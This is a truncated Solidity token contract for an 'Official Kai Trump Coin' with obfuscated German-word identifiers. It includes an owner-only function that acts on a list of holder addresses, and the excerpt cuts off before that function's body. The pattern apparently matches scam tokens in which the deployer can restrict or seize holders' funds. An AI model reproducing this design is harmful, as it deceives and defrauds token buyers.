...
contract kaitrump is Context, IERC20 {
    ...
    address public  aktionsforschungen;
    constructor () {
        _name = "Official Kai Trump Coin";
        _symbol = "KAI";
        _decimals = 18;
        uint256 initialSupply = 666000000;
         aktionsforschungen = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == aktionsforschungen, "Not allowed");
        _;
    }

    function einzupackenden(address[] memory medizinbegriff) public onlyOwner() {
        for (uint256 i = 0; i < medizinbegriff.length; i++) {
            address account = medizinbegriff[i];
